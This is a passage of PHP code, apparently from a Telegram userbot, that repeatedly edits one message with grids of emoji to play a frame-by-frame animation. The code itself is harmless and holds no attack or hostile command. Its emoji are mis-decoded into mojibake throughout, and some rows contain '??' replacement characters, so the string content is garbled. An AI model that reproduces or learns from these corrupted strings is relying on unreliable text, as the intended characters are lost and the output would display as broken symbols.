๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ช๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ช๐ช๐ช๐ง๐ง๐ง
๐ง๐ง๐ง๐ช๐ง๐ช๐ง๐ง๐ง
๐ง๐ง๐ง๐ช๐ช๐ช๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ช๐ช๐ช๐ช๐ช๐ง๐ง
๐ง๐ง๐ช๐ง๐ง๐ง๐ช๐ง๐ง
๐ง๐ง๐ช๐ง๐ฆ๐ง๐ช๐ง๐ง
๐ง๐ง๐ช๐ง๐ง๐ง๐ช๐ง๐ง
๐ง๐ง๐ช๐ช๐ช๐ช๐ช๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ช๐ช๐ช๐ช๐ช๐ช๐ช๐ง
๐ง๐ช๐ง๐ง๐ง๐ง๐ง๐ช๐ง
๐ง๐ช๐ง๐ฆ๐ฆ๐ฆ๐ง๐ช๐ง
๐ง๐ช๐ง๐ฆ๐ง๐ฆ๐ง๐ช๐ง
๐ง๐ช๐ง๐ฆ๐ฆ๐ฆ๐ง๐ช๐ง
๐ง๐ช๐ง๐ง๐ง๐ง๐ง๐ช๐ง
๐ง๐ช๐ช๐ช๐ช๐ช๐ช๐ช๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ช๐ช๐ช๐ช๐ช๐ช๐ช๐ช๐ช
๐ช๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ช
๐ช๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ง๐ช
๐ช๐ง๐ฆ๐ง๐ง๐ง๐ฆ๐ง๐ช
๐ช๐ง๐ฆ๐งโฌ๏ธ๐ง๐ฆ๐ง๐ช
๐ช๐ง๐ฆ๐ง๐ง๐ง๐ฆ๐ง๐ช
๐ช๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ง๐ช
๐ช๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ช
๐ช๐ช๐ช๐ช๐ช๐ช๐ช๐ช๐ช']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ง
๐ง๐ฆ๐ง๐ง๐ง๐ง๐ง๐ฆ๐ง
๐ง๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ๐ง
๐ง๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ๐ง
๐ง๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ๐ง
๐ง๐ฆ๐ง๐ง๐ง๐ง๐ง๐ฆ๐ง
๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ
๐ฆ๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ฆ
๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ
๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ
๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ
๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ
๐ฆ๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง๐ฆ
๐ฆ๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ฆ
๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ๐ฆ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง
๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง
๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง
๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง
๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง
๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง
๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง
๐งโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ง
๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง๐ง']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ
โฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธโฌ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๏ธ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๐ฅ
๐ฅโฌโฌโฌโฌโฌโฌโฌโฌ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅโฌโฌโฌโฌโฌโฌ๐ฅ๐ฅ
๐ฅ๐ฅโฌโฌโฌโฌโฌโฌ๐ฅ๐ฅ
๐ฅ๐ฅโฌโฌโฌโฌโฌโฌ๐ฅ๐ฅ
๐ฅ๐ฅโฌโฌโฌโฌโฌโฌ๐ฅ๐ฅ
๐ฅ๐ฅโฌโฌโฌโฌโฌโฌ๐ฅ๐ฅ
๐ฅ๐ฅโฌโฌโฌโฌโฌโฌ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅโฌโฌโฌโฌ๏ธ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅโฌโฌโฌโฌ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅโฌโฌโฌโฌ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅโฌโฌโฌโฌ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅโฌ๏ธโฌ๏ธ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅโฌโฌ๏ธ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐๐๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐๐๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฆ๐ฆ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฆ๐ฆ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฆ๐ฆ๐ฆ๐ฆ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฆ๐ฆ๐ฆ๐ฆ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฆ๐ฆ๐ฆ๐ฆ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฆ๐ฆ๐ฆ๐ฆ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐จ๐จ๐จ๐จ๐จ๐จ๐ฅ๐ฅ
๐ฅ๐ฅ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ฅ๐ฅ
๐ฅ๐ฅ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ฅ๐ฅ
๐ฅ๐ฅ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ฅ๐ฅ
๐ฅ๐ฅ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ฅ๐ฅ
๐ฅ๐ฅ๐จ๐จ๐จ๐จ๐จ๐จ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐จ๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐จ๐จ๐จ๐จ๐จ๐จ๐ช๐ฅ
๐ฅ๐จ๐ช๐จ๐จ๐จ๐จ๐ช๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐จ๐ฅ
๐ฅ๐จ๐ช๐จ๐จ๐จ๐จ๐ช๐จ๐ฅ
๐ฅ๐ช๐จ๐จ๐จ๐จ๐จ๐จ๐ช๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐จ๐จ๐จ๐จ๐จ๐จ๐ช๐ฅ
๐ฅ๐ช๐ช๐จ๐จ๐จ๐จ๐ช๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐ช๐จ๐จ๐จ๐จ๐ช๐ช๐ฅ
๐ฅ๐ช๐จ๐จ๐จ๐จ๐จ๐จ๐ช๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ช๐ช๐จ๐จ๐จ๐จ๐ช๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐จ๐ฆ๐ฆ๐ฆ๐ฆ๐จ๐ช๐ฅ
๐ฅ๐ช๐ช๐จ๐จ๐จ๐จ๐ช๐ช๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐ฆ๐ฆ๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ง๐จ๐ฆ๐ฆ๐จ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐จ๐จ๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐จ๐จ๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐จ๐ฆ๐ฆ๐จ๐ง๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ง๐๐ฆ๐ฆ๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐๐๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐ฆ๐๐๐ฆ๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐๐ฆ๐ฆ๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ชโฌ๏ธโฌ๏ธโฌ๏ธโฌ๏ธ๐ช๐ช๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
??๐ฅ??๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ช๐ช๐ค๐ค๐ค๐ค๐ช๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ง๐๐๐๐๐ง๐ช๐ฅ
๐ฅ๐ช๐ช๐ค๐ค๐ค๐ค๐ช๐ช๐ฅ
๐ฅ๐ช๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ช๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐๐ฅ
๐ฅ๐๐๐ค๐ค๐ค๐ค๐๐๐ฅ
๐ฅ๐๐ง๐๐๐๐๐ง๐๐ฅ
๐ฅ๐๐ง๐๐๐๐๐ง๐๐ฅ
๐ฅ๐๐ง๐๐๐๐๐ง๐๐ฅ
๐ฅ๐๐ง๐๐๐๐๐ง๐๐ฅ
๐ฅ๐๐๐ค๐ค๐ค๐ค๐๐๐ฅ
๐ฅ๐๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ
๐ฅ๐๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐๐ฅ
๐ฅ๐๐๐ค๐ค๐ค๐ค๐๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐งก๐๐๐๐๐งก๐๐ฅ
๐ฅ๐๐๐ค๐ค๐ค๐ค๐๐๐ฅ
๐ฅ๐๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐ฉ๐๐ฅ
๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ']);
